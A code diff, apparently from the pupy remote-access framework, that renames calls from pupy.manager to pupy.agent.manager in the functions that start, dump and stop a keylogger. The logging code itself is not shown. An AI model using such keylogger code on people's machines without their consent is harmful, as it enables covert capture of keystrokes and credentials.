@@ -94,11 +94,11 @@ UNPRINTABLE = {
 
 
 def keylogger_start(event_id=None):
-    if pupy.manager.active(KeyLogger):
+    if pupy.agent.manager.active(KeyLogger):
         return False
 
     try:
-        pupy.manager.create(KeyLogger, event_id=event_id)
+        pupy.agent.manager.create(KeyLogger, event_id=event_id)
     except:
         return False
 
@@ -106,15 +106,15 @@ def keylogger_start(event_id=None):
 
 
 def keylogger_dump():
-    keylogger = pupy.manager.get(KeyLogger)
+    keylogger = pupy.agent.manager.get(KeyLogger)
     if keylogger:
         return keylogger.results
 
 
 def keylogger_stop():
-    keylogger = pupy.manager.get(KeyLogger)
+    keylogger = pupy.agent.manager.get(KeyLogger)
     if keylogger:
-        pupy.manager.stop(KeyLogger)
+        pupy.agent.manager.stop(KeyLogger)
         return keylogger.results
 
 
